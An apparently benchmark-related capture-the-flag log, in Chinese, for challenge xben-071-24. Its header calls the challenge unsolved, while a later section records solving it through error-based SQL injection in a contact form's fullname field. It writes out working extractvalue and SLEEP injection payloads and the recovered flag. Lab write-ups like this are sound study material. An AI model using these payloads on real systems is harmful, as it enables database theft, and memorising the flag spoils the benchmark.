# xben-071-24 · 探索记录（未解）

对应题解：暂无（本题未拿到 flag）

## 结论

纯静态站（Founter 模板：index/signin/signup/style.css/bundle.js）。`signin.html`/`signup.html` 的表单 action 指向外部 `formbold.com`，没有后端接口。未找到 flag。

## 尝试过程

- 首页 73KB 静态 HTML，`bundle.js` 744KB 是第三方库集合，无自定义逻辑。
- `/signin.html`、`/signup.html` 提交到 `https://formbold.com/s/unique_form_id`（外部服务）。
- 字典扫出 `images/`（403）、`.htaccess`（403）、`server-status`（403）；无动态路由。

## 说明

本文件只记录实际做过的请求与判据；没有验证过的猜想不写进结论。

## 解出（2026-10-28）

- 首页 73KB，大部分表单 action 指向 `https://formbold.com/s/unique_form_id`，
  但底部联系表单 action 是本地 **`send.php`**；另外还有 `signin.html` / `signup.html`
  （表单同样指向 formbold）。
- `GET send.php` → 302 `index.html`；`POST` 缺 `phone` 时泄漏
  `Warning: Undefined array key "phone" in /var/www/html/send.php on line 22`。
- `fullname=a'` → PHP 8.3 未捕获 `mysqli_sql_exception`：
  `near ''a''' ... mysqli->prepare('SELECT * FROM c...')`，证明是**字符串拼接后 prepare**。
- 报错注入：
  - `a' AND extractvalue(1,concat(0x7e,database()))#` → `~challenge`
  - 表：`contact`、`flag`；`flag` 列：`id`、`flag`
  - `substr(flag,1,25)` → `flag{59907352-e47f-4171-b`
  - `substr(flag,26,25)` → `423-de62db0bab63}`
- 时间盲注也能用（`fullname=a' AND (SELECT SLEEP(3)...)` 会拖到 21s），但报错注入更快。
